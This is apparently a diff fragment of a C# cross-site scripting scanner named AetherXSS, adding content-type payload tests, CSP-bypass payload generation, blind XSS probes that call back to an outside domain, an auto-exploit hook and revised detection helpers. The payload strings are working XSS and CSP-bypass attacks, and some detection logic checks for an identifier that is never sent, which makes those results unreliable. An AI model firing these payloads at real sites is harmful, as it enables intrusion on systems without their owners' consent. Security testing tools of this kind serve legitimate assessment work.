+                                StringContent content;
+                                
+                                switch (contentType)
+                                {
+                                    case "application/json":
+                                        content = new StringContent($"{{\"data\":{payload}}}", Encoding.UTF8, contentType);
+                                        break;
+                                        
+                                    case "application/xml":
+                                    case "application/soap+xml":
+                                        content = new StringContent(payload, Encoding.UTF8, contentType);
+                                        break;
+                                        
+                                    case "application/graphql":
+                                        content = new StringContent(payload, Encoding.UTF8, contentType);
+                                        break;
+                                        
+                                    case "application/javascript":
+                                        content = new StringContent($"var data = '{payload}';", Encoding.UTF8, contentType);
+                                        break;
+                                        
+                                    default:
+                                        content = new StringContent(payload, Encoding.UTF8, contentType);
+                                        break;
+                                }
+                                
+                                request.Content = content;
+                                
+                                // Send the request
+                                HttpResponseMessage response = await client.SendAsync(request);
+                                responseBody = await response.Content.ReadAsStringAsync();
+                                
+                                // Cache the response
+                                httpResponseCache[cacheKey] = responseBody;
+                                
+                                lock (statistics)
+                                {
+                                    statistics["testedUrls"]++;
+                                }
+                                
+                                // Check if the payload is reflected in the response
+                                if (IsXssVulnerable(responseBody, payload))
+                                {
+                                    lock (discoveredVulnerabilities)
+                                    {
+                                        discoveredVulnerabilities.Add($"Content-Type ({contentType}): {url}");
+                                    }
+                                    
+                                    lock (statistics)
+                                    {
+                                        statistics["vulnerableUrls"]++;
+                                    }
+                                    
+                                    PrintColored($"\n[!] XSS Vulnerability Detected in {contentType} context! {url}", ConsoleColor.Red);
+                                    AnimatedUI.ShowVulnerabilityFound(url, $"{contentType} Injection");
+                                    
+                                    if (autoExploit)
+                                    {
+                                        await AutoExploit(url, "POST", payload);
+                                    }
+                                }
+                                else if (verbose)
+                                {
+                                    PrintColored($"\n[-] {url} ({contentType}) appears clean for payload: {payload.Substring(0, Math.Min(30, payload.Length))}...", ConsoleColor.Green);
+                                }
+                                
+                                // Apply delay if specified
+                                if (delayBetweenRequests > 0)
+                                {
+                                    await Task.Delay(delayBetweenRequests);
+                                }
+                            }
+                            else if (verbose)
+                            {
+                                PrintColored($"\n[+] Using cached {contentType} test for {url}", ConsoleColor.Cyan);
+                            }
+                        }
+                    }
+                    catch (Exception ex)
+                    {
+                        lock (statistics)
+                        {
+                            statistics["failedRequests"]++;
+                        }
+                        
+                        if (verbose)
+                        {
+                            PrintColored($"\n[!] Error testing {contentType} payloads: {ex.Message}", ConsoleColor.Yellow);
+                        }
+                    }
+                    finally
+                    {
+                        semaphore.Release();
+                    }
+                }));
+            }
+            
+            // Wait for all content type tests to complete
+            await Task.WhenAll(contentTypeTasks);
+        }
+        
+        if (verbose)
+        {
+            PrintColored("\n[+] Content-type specific payload testing completed.", ConsoleColor.Green);
+        }
+    }
+    catch (Exception ex)
+    {
+        if (verbose)
+        {
+            PrintColored($"\n[!] Error in content-type testing: {ex.Message}", ConsoleColor.Red);
+        }
+    }
+}
+
+// Helper method to check if a script tag is in an executable context
+bool IsExecutableScriptContext(string html, string payload)
+{
+    try
+    {
+        // Check if the payload contains a script tag
+        if (!payload.Contains("<script") || !html.Contains("<script"))
+            return false;
+            
+        // Simple check for dangerous content in both payload and HTML
+        if (payload.Contains("alert") && html.Contains("alert"))
+            return true;
+            
+        if (payload.Contains("console.log") && html.Contains("console.log"))
+            return true;
+            
+        // Check for eval or other dangerous functions
+        if ((payload.Contains("eval") && html.Contains("eval")) ||
+            (payload.Contains("setTimeout") && html.Contains("setTimeout")) ||
+            (payload.Contains("setInterval") && html.Contains("setInterval")))
+            return true;
+            
+        // Check for document.write
+        if (payload.Contains("document.write") && html.Contains("document.write"))
+            return true;
+            
+        // Check for innerHTML
+        if (payload.Contains("innerHTML") && html.Contains("innerHTML"))
+            return true;
+        
+        return false;
+    }
+    catch
+    {
+        return false;
+    }
+}
+
+// Helper method to check if an event handler is in an executable context
+bool IsExecutableEventHandlerContext(string html, string payload)
+{
+    try
+    {
+        // Check if the payload contains an event handler using simple string check
+        if (!(payload.Contains("onclick=") || payload.Contains("onmouseover=") || 
+              payload.Contains("onload=") || payload.Contains("onerror=") || 
+              payload.Contains("onmouseout=") || payload.Contains("onkeypress=") ||
+              payload.Contains("onchange=") || payload.Contains("onfocus=")))
+            return false;
+            
+        // Check if the HTML contains the same event handlers
+        bool hasEventHandler = html.Contains("onclick=") || html.Contains("onmouseover=") || 
+                               html.Contains("onload=") || html.Contains("onerror=") || 
+                               html.Contains("onmouseout=") || html.Contains("onkeypress=") ||
+                               html.Contains("onchange=") || html.Contains("onfocus=");
+        
+        if (!hasEventHandler)
+            return false;
+            
+        // If we found an event handler, check if it contains dangerous content
+        if ((payload.Contains("alert") && html.Contains("alert")) ||
+            (payload.Contains("eval") && html.Contains("eval")) ||
+            (payload.Contains("console.log") && html.Contains("console.log")))
+            return true;
+        
+        return false;
+    }
+    catch
+    {
+        return false;
+    }
+}
+
+// Helper method to check if a javascript: URL is in an executable context
+bool IsExecutableUrlContext(string html, string payload)
+{
+    try
+    {
+        // Check if the payload contains a javascript: URL
+        if (!payload.Contains("javascript:"))
+            return false;
+            
+        // Look for javascript: URLs in href, src, or other URL attributes using simpler approach
+        if (html.Contains("href=javascript:") || html.Contains("href='javascript:") || html.Contains("href=\"javascript:") ||
+            html.Contains("src=javascript:") || html.Contains("src='javascript:") || html.Contains("src=\"javascript:") ||
+            html.Contains("action=javascript:") || html.Contains("action='javascript:") || html.Contains("action=\"javascript:") ||
+            html.Contains("data=javascript:") || html.Contains("data='javascript:") || html.Contains("data=\"javascript:"))
+        {
+            // If we found a javascript: URL, check if it contains our payload content
+            if ((payload.Contains("alert") && html.Contains("alert")) ||
+                (payload.Contains("eval") && html.Contains("eval")) ||
+                (payload.Contains("console.log") && html.Contains("console.log")))
+                return true;
+        }
+            
+        return false;
+    }
+    catch
+    {
+        return false;
+    }
+}
+
+// Method to analyze CSP headers
+Dictionary<string, string> AnalyzeCspHeaders(HttpResponseMessage response)
+{
+    var cspDirectives = new Dictionary<string, string>();
+    
+    if (response.Headers.Contains("Content-Security-Policy"))
+    {
+        var cspHeader = response.Headers.GetValues("Content-Security-Policy").FirstOrDefault();
+        if (!string.IsNullOrEmpty(cspHeader))
+        {
+            var directives = cspHeader.Split(';');
+            foreach (var directive in directives)
+            {
+                var parts = directive.Trim().Split(new[] { ' ' }, 2);
+                if (parts.Length == 2)
+                {
+                    cspDirectives[parts[0]] = parts[1];
+                }
+            }
+        }
+    }
+    
+    return cspDirectives;
+}
+
+// Method to generate CSP bypass payloads
+List<string> GenerateCspBypassPayloads(Dictionary<string, string> cspDirectives)
+{
+    var bypassPayloads = new List<string>();
+    
+    // Check for unsafe-inline in script-src
+    if (cspDirectives.TryGetValue("script-src", out string scriptSrc))
+    {
+        if (scriptSrc.Contains("unsafe-inline"))
+        {
+            bypassPayloads.Add("<script>alert('CSP Bypass - unsafe-inline')</script>");
+        }
+        
+        if (scriptSrc.Contains("unsafe-eval"))
+        {
+            bypassPayloads.Add("<script>eval('alert(\"CSP Bypass - unsafe-eval\")')</script>");
+        }
+        
+        // Check for whitelisted domains
+        foreach (var domain in scriptSrc.Split(' '))
+        {
+            if (domain.StartsWith("https://") || domain.StartsWith("http://"))
+            {
+                bypassPayloads.Add($"<script src=\"{domain}/angular.js\"></script><div ng-app>{{constructor.constructor('alert(\"CSP Bypass - Whitelisted Domain\")')()}}</div>");
+            }
+        }
+    }
+    
+    // Check for object-src none
+    if (!cspDirectives.ContainsKey("object-src") || cspDirectives["object-src"] != "none")
+    {
+        bypassPayloads.Add("<object data=\"javascript:alert('CSP Bypass - object-src not restricted')\"></object>");
+    }
+    
+    // Check for base-uri
+    if (!cspDirectives.ContainsKey("base-uri"))
+    {
+        bypassPayloads.Add("<base href=\"javascript:alert('CSP Bypass - base-uri not restricted')\"><a href=\"#\">Click me</a>");
+    }
+    
+    // Check for form-action
+    if (!cspDirectives.ContainsKey("form-action"))
+    {
+        bypassPayloads.Add("<form action=\"javascript:alert('CSP Bypass - form-action not restricted')\"><input type=\"submit\" value=\"Submit\"></form>");
+    }
+    
+    // Check for JSONP endpoints in connect-src
+    if (cspDirectives.TryGetValue("connect-src", out string connectSrc))
+    {
+        foreach (var domain in connectSrc.Split(' '))
+        {
+            if (domain.StartsWith("https://") || domain.StartsWith("http://"))
+            {
+                bypassPayloads.Add($"<script src=\"{domain}/api/jsonp?callback=alert('CSP Bypass - JSONP')\"></script>");
+            }
+        }
+    }
+    
+    return bypassPayloads;
+}
+
+// Method to test for CSP bypasses
+async Task TestCspBypasses(string url, string cookie, Dictionary<string, string> extraHeaders, string customUserAgent)
+{
+    try
+    {
+        if (verbose)
+        {
+            PrintColored("\n[*] Testing for CSP bypasses...", ConsoleColor.Cyan);
+        }
+        
+        // First, get the page content to analyze CSP headers
+        HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Get, url);
+        AddHeaders(request, cookie, extraHeaders, customUserAgent);
+        
+        HttpResponseMessage response = await client.SendAsync(request);
+        string responseBody = await response.Content.ReadAsStringAsync();
+        
+        // Analyze CSP headers
+        Dictionary<string, string> cspDirectives = AnalyzeCspHeaders(response);
+        
+        if (cspDirectives.Count > 0)
+        {
+            if (verbose)
+            {
+                PrintColored("\n[+] Content Security Policy detected:", ConsoleColor.Green);
+                foreach (var directive in cspDirectives)
+                {
+                    PrintColored($"    {directive.Key}: {directive.Value}", ConsoleColor.Green);
+                }
+            }
+            
+            // Generate bypass payloads
+            List<string> bypassPayloads = GenerateCspBypassPayloads(cspDirectives);
+            
+            if (bypassPayloads.Count > 0)
+            {
+                if (verbose)
+                {
+                    PrintColored($"\n[*] Testing {bypassPayloads.Count} potential CSP bypasses...", ConsoleColor.Cyan);
+                }
+                
+                // Use SemaphoreSlim to limit concurrent requests
+                using (SemaphoreSlim semaphore = new SemaphoreSlim(maxThreads))
+                {
+                    List<Task> cspTasks = new List<Task>();
+                    
+                    foreach (var payload in bypassPayloads)
+                    {
+                        await semaphore.WaitAsync();
+                        
+                        cspTasks.Add(Task.Run(async () =>
+                        {
+                            try
+                            {
+                                // Generate a cache key for this CSP test
+                                string cacheKey = $"CSP_{url}_{payload.GetHashCode()}";
+                                
+                                // Check if we have a cached response
+                                if (!httpResponseCache.TryGetValue(cacheKey, out string cachedResponseBody))
+                                {
+                                    // Send a POST request with the CSP bypass payload
+                                    HttpRequestMessage cspRequest = new HttpRequestMessage(HttpMethod.Post, url);
+                                    AddHeaders(cspRequest, cookie, extraHeaders, customUserAgent);
+                                    
+                                    // Prepare the payload
+                                    StringContent content = new StringContent(payload, Encoding.UTF8, "application/x-www-form-urlencoded");
+                                    cspRequest.Content = content;
+                                    
+                                    // Send the request
+                                    HttpResponseMessage cspResponse = await client.SendAsync(cspRequest);
+                                    string cspResponseBody = await cspResponse.Content.ReadAsStringAsync();
+                                    
+                                    // Cache the response
+                                    httpResponseCache[cacheKey] = cspResponseBody;
+                                    
+                                    lock (statistics)
+                                    {
+                                        statistics["testedUrls"]++;
+                                    }
+                                    
+                                    // Check if the payload is reflected in the response
+                                    if (IsXssVulnerable(cspResponseBody, payload))
+                                    {
+                                        lock (discoveredVulnerabilities)
+                                        {
+                                            discoveredVulnerabilities.Add($"CSP Bypass: {url}");
+                                        }
+                                        
+                                        lock (statistics)
+                                        {
+                                            statistics["vulnerableUrls"]++;
+                                        }
+                                        
+                                        PrintColored($"\n[!] CSP Bypass Vulnerability Detected! {url}", ConsoleColor.Red);
+                                        PrintColored($"    Payload: {payload}", ConsoleColor.Red);
+                                        AnimatedUI.ShowVulnerabilityFound(url, "CSP Bypass");
+                                        
+                                        if (autoExploit)
+                                        {
+                                            await AutoExploit(url, "POST", payload);
+                                        }
+                                    }
+                                    else if (verbose)
+                                    {
+                                        PrintColored($"\n[-] {url} appears protected against CSP bypass: {payload.Substring(0, Math.Min(30, payload.Length))}...", ConsoleColor.Green);
+                                    }
+                                    
+                                    // Apply delay if specified
+                                    if (delayBetweenRequests > 0)
+                                    {
+                                        await Task.Delay(delayBetweenRequests);
+                                    }
+                                }
+                                else if (verbose)
+                                {
+                                    PrintColored($"\n[+] Using cached CSP bypass test for {url}", ConsoleColor.Cyan);
+                                }
+                            }
+                            catch (Exception ex)
+                            {
+                                lock (statistics)
+                                {
+                                    statistics["failedRequests"]++;
+                                }
+                                
+                                if (verbose)
+                                {
+                                    PrintColored($"\n[!] Error testing CSP bypass: {ex.Message}", ConsoleColor.Yellow);
+                                }
+                            }
+                            finally
+                            {
+                                semaphore.Release();
+                            }
+                        }));
+                    }
+                    
+                    // Wait for all CSP tests to complete
+                    await Task.WhenAll(cspTasks);
+                }
+            }
+            else if (verbose)
+            {
+                PrintColored("\n[+] CSP appears to be well-configured. No obvious bypasses found.", ConsoleColor.Green);
+            }
+        }
+        else if (verbose)
+        {
+            PrintColored("\n[-] No Content Security Policy detected.", ConsoleColor.Yellow);
+        }
+        
+        if (verbose)
+        {
+            PrintColored("\n[+] CSP bypass testing completed.", ConsoleColor.Green);
+        }
+    }
+    catch (Exception ex)
+    {
+        if (verbose)
+        {
+            PrintColored($"\n[!] Error in CSP bypass testing: {ex.Message}", ConsoleColor.Red);
+        }
+    }
+}
+
+// Method to test for Blind XSS vulnerabilities
+async Task TestBlindXss(string url, string cookie, Dictionary<string, string> extraHeaders, string customUserAgent)
+{
+    try
+    {
+        PrintColored("\n[*] Testing for Blind XSS vulnerabilities...", ConsoleColor.Magenta);
+        PrintColored($"[*] Using callback domain: {callbackDomain}", ConsoleColor.Magenta);
+        PrintColored($"[*] Blind XSS payloads will attempt to call back to this domain if triggered", ConsoleColor.Magenta);
+        
+        // Use SemaphoreSlim to limit concurrent requests
+        using (SemaphoreSlim semaphore = new SemaphoreSlim(maxThreads))
+        {
+            List<Task> blindTasks = new List<Task>();
+            
+            // Test each blind XSS payload
+            foreach (var payload in blindXssPayloads)
+            {
+                await semaphore.WaitAsync();
+                
+                blindTasks.Add(Task.Run(async () =>
+                {
+                    try
+                    {
+                        // Generate a unique identifier for this test
+                        string testId = Guid.NewGuid().ToString().Substring(0, 8);
+                        string uniquePayload = payload.Replace("{{ID}}", testId);
+                        
+                        // Test GET request with the blind payload
+                        string encodedPayload = HttpUtility.UrlEncode(uniquePayload);
+                        string testUrl = url.Contains("?") ? $"{url}&blindxss={encodedPayload}" : $"{url}?blindxss={encodedPayload}";
+                        
+                        // Generate a cache key
+                        string cacheKey = $"BLIND_{testUrl}_{cookie}_{string.Join(",", extraHeaders.Select(h => $"{h.Key}={h.Value}"))}_{customUserAgent}";
+                        
+                        // Check if we have a cached response
+                        if (!httpResponseCache.TryGetValue(cacheKey, out _))
+                        {
+                            HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Get, testUrl);
+                            AddHeaders(request, cookie, extraHeaders, customUserAgent);
+                            
+                            // Add a custom header to track the blind XSS test
+                            request.Headers.Add("X-Blind-XSS-Test", testId);
+                            
+                            await client.SendAsync(request);
+                            
+                            // Also test POST request with the blind payload
+                            HttpRequestMessage postRequest = new HttpRequestMessage(HttpMethod.Post, url);
+                            AddHeaders(postRequest, cookie, extraHeaders, customUserAgent);
+                            
+                            var content = new FormUrlEncodedContent(new[]
+                            {
+                                new KeyValuePair<string, string>("blindxss", uniquePayload)
+                            });
+                            postRequest.Content = content;
+                            
+                            await client.SendAsync(postRequest);
+                            
+                            // Cache the response
+                            httpResponseCache[cacheKey] = "SENT";
+                            
+                            lock (statistics)
+                            {
+                                statistics["testedUrls"] += 2; // Count both GET and POST
+                            }
+                            
+                            if (verbose)
+                            {
+                                PrintColored($"\n[+] Sent Blind XSS payload to {url} (ID: {testId})", ConsoleColor.Cyan);
+                            }
+                        }
+                        else if (verbose)
+                        {
+                            PrintColored($"\n[+] Using cached Blind XSS test for {url}", ConsoleColor.Cyan);
+                        }
+                    }
+                    catch (Exception ex)
+                    {
+                        lock (statistics)
+                        {
+                            statistics["failedRequests"]++;
+                        }
+                        
+                        if (verbose)
+                        {
+                            PrintColored($"\n[!] Error in Blind XSS test: {ex.Message}", ConsoleColor.Yellow);
+                        }
+                    }
+                    finally
+                    {
+                        semaphore.Release();
+                    }
+                }));
+            }
+            
+            // Wait for all blind XSS tests to complete
+            await Task.WhenAll(blindTasks);
+        }
+        
+        PrintColored("\n[+] Blind XSS testing completed. Check your callback server for potential hits.", ConsoleColor.Green);
+        PrintColored($"[*] Note: Blind XSS vulnerabilities may trigger days or weeks later when someone visits the affected page.", ConsoleColor.Yellow);
+    }
+    catch (Exception ex)
+    {
+        if (verbose)
+        {
+            PrintColored($"\n[!] Error in Blind XSS testing: {ex.Message}", ConsoleColor.Red);
+        }
+    }
 }
 
 void GenerateReport(string reportPath)
@@ -1887,7 +2931,7 @@ void GenerateReport(string reportPath)
         else
         {
             report.AppendLine("<h2>No Vulnerabilities Found</h2>");
-            report.AppendLine("<p>No Cross-Site Scripting vulnerabilities were detected during the scan. However, we recommend implementing the following security best practices:</p>");
+            report.AppendLine("<p>No Cross-Site Scripting vulnerabilities were detected during the scan. However, this does not guarantee that the application is completely secure, as new vulnerabilities are discovered regularly.</p>");
             report.AppendLine("<ul>");
             report.AppendLine("<li>Implement Content Security Policy (CSP) headers</li>");
             report.AppendLine("<li>Use modern frameworks with built-in XSS protection</li>");
@@ -2019,42 +3063,77 @@ async Task TestWAFBypass(string url, string cookie, Dictionary<string, string> e
 // New method for better XSS detection
 bool IsXssVulnerable(string responseBody, string payload)
 {
-    // First check for direct reflection
-    if (responseBody.Contains(payload))
+    // Generate a unique identifier for this test to reduce false positives
+    string uniqueId = Guid.NewGuid().ToString().Substring(0, 8);
+    string uniquePayload = payload.Replace("XSS", $"XSS-{uniqueId}");
+    
+    // If the payload doesn't contain 'XSS', try to insert our unique ID elsewhere
+    if (uniquePayload == payload)
+    {
+        if (payload.Contains("alert"))
+        {
+            uniquePayload = payload.Replace("alert", $"alert-{uniqueId}");
+        }
+        else if (payload.Contains("<script>"))
+        {
+            uniquePayload = payload.Replace("<script>", $"<script data-id=\"{uniqueId}\">");
+        }
+        else
+        {
+            // For other payloads, add a comment with our unique ID
+            uniquePayload = payload + $"<!-- {uniqueId} -->";
+        }
+    }
+    
+    // First check for direct reflection of our unique payload
+    if (responseBody.Contains(uniqueId))
         return true;
 
     // Check for URL-encoded versions
-    string encodedPayload = HttpUtility.UrlEncode(payload);
-    if (responseBody.Contains(encodedPayload))
+    string encodedPayload = HttpUtility.UrlEncode(uniquePayload);
+    if (responseBody.Contains(uniqueId) && responseBody.Contains(encodedPayload))
         return true;
 
     // Check for HTML-encoded versions
-    string htmlEncodedPayload = HttpUtility.HtmlEncode(payload);
-    if (responseBody.Contains(htmlEncodedPayload))
+    string htmlEncodedPayload = HttpUtility.HtmlEncode(uniquePayload);
+    if (responseBody.Contains(uniqueId) && responseBody.Contains(htmlEncodedPayload))
         return true;
 
     // Check for double-encoded versions
-    string doubleEncodedPayload = HttpUtility.UrlEncode(HttpUtility.UrlEncode(payload));
-    if (responseBody.Contains(doubleEncodedPayload))
+    string doubleEncodedPayload = HttpUtility.UrlEncode(HttpUtility.UrlEncode(uniquePayload));
+    if (responseBody.Contains(uniqueId) && responseBody.Contains(doubleEncodedPayload))
         return true;
+
+    // If we're using the original payload (not our uniquely modified one)
+    // we need to fall back to the original detection logic
+    if (uniquePayload == payload)
+    {
+        // First check for direct reflection
+        if (responseBody.Contains(payload))
+            return true;
+
+        // Check for URL-encoded versions
+        if (responseBody.Contains(encodedPayload))
+            return true;
+
+        // Check for HTML-encoded versions
+        if (responseBody.Contains(htmlEncodedPayload))
+            return true;
+
+        // Check for double-encoded versions
+        if (responseBody.Contains(doubleEncodedPayload))
+            return true;
+    }
 
     // Advanced checks for partial reflections that could still be vulnerable
-    if (payload.Contains("<script>") && responseBody.Contains("<script>"))
-    {
-        if (payload.Contains("alert") && responseBody.Contains("alert"))
-            return true;
-    }
-
-    if (payload.Contains("onerror") && responseBody.Contains("onerror"))
-    {
-        if (payload.Contains("alert") && responseBody.Contains("alert"))
-            return true;
-    }
-
-    if (payload.Contains("javascript:") && responseBody.Contains("javascript:"))
-    {
+    if (IsExecutableScriptContext(responseBody, payload))
         return true;
-    }
+        
+    if (IsExecutableEventHandlerContext(responseBody, payload))
+        return true;
+        
+    if (IsExecutableUrlContext(responseBody, payload))
+        return true;
 
     return false;
 }
@@ -2157,14 +3236,28 @@ namespace AetherXSS
             int i = 0;
             DateTime endTime = DateTime.Now.AddMilliseconds(duration);
             
-            // Simple spinner characters
+            // Simple spinner characters - optimized for faster display
             string[] spinnerChars = new string[] { "|", "/", "-", "\\" };
 
-            while (DateTime.Now < endTime)
+            // Ultra-fast animation with minimal sleep time
+            // For very short durations, just show the message immediately
+            if (duration <= 100)
+            {
+                Console.WriteLine($"[+] {message}");
+                return;
+            }
+            
+            // Super fast animation for short durations
+            int sleepTime = Math.Min(10, duration / 20); // Even faster animation
+            int maxIterations = Math.Min(5, duration / 20); // Limit iterations for very short durations
+            int iteration = 0;
+            
+            while (DateTime.Now < endTime && iteration < maxIterations)
             {
                 Console.Write($"\r[{spinnerChars[i % spinnerChars.Length]}] {message}");
-                Thread.Sleep(100);
+                Thread.Sleep(sleepTime);
                 i++;
+                iteration++;
             }
             Console.WriteLine();
         }
